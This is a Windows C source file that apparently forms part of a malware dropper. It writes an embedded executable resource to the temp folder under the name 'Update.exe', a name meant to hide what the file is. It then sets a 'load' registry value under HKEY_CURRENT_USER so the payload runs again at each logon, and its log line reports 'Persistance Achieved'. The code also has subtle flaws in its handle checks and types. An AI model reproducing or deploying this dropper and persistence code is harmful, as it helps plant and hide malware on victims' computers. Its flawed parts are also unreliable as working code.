#include <windows.h>
#include <stdio.h>
#include <shlwapi.h>
#include "resource.h"
#include "common.h"

BOOL WritePayloadToTemp(IN LPCWSTR TempDirectory)
{
	HRSRC hResource = FindResourceA(NULL, MAKEINTRESOURCEA(IDR_EXE1), "EXE");
	DWORD dwSize = SizeofResource(NULL, hResource);
	HGLOBAL hData = LoadResource(NULL, hResource);
	PVOID pPayload = NULL;
	HANDLE hFile = NULL;
	DWORD dwNumOfWritten = 0x00;

	if (!(pPayload = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize)))
	{
		LOG_ERR("HeapAlloc");
		return -1;
	}
	printf("(+) Payload Located @ 0x%p\n", pPayload);

	memcpy(pPayload, hData, dwSize);

	if (!(hFile = CreateFileW(TempDirectory, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL)))
	{
		LOG_ERR("CreateFileW");
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, pPayload);
		return -1;
	}

	if (!WriteFile(hFile, pPayload, dwSize, &dwNumOfWritten, NULL))
	{
		LOG_ERR("WriteFile");
		CloseHandle(hFile);
		HeapFree(GetProcessHeap(), 0, pPayload);
		return -1;
	}
	printf("(+) Payload Successfully Written In Temp...\n");

	if (hFile) { CloseHandle(hFile); }
	if (pPayload != NULL) { HeapFree(GetProcessHeap(), 0, pPayload); }
	return TRUE;
}

BOOL ActivatePersistance()
{
	HKEY hKey = NULL;
	LRESULT result = 0x00;
	LPCWSTR tempPath[ MAX_PATH ];

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	if ( !GetTempPathW( MAX_PATH, &tempPath ) )
	{
		LOG_ERR( "GetTempPathA" );
		return -1;
	}

	StrCatW( tempPath, L"Update.exe" );
	wprintf( L"(+) Temp Path: %ls\n", tempPath );

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	result = RegOpenKeyW(
		HKEY_CURRENT_USER, REGISTRY_SUBKEY, &hKey );
	if ( result != ERROR_SUCCESS )
	{
		REG_ERR( "RegOpenKeyW", result );
		RegCloseKey( hKey );
		return -1;
	}

	result = RegSetKeyValueW( HKEY_CURRENT_USER, REGISTRY_SUBKEY, L"load",
	                          REG_SZ, tempPath, MAX_PATH + 1 );
	if ( result != ERROR_SUCCESS )
	{
		REG_ERR( "RegSetKeyValueW" );
		RegCloseKey( hKey );
		return -1;
	}
	printf( "(+) Persistance Achieved...\n" );

	/* ---------------------------------------------------------------------------------------------------------------------------------------- */

	return TRUE;
}
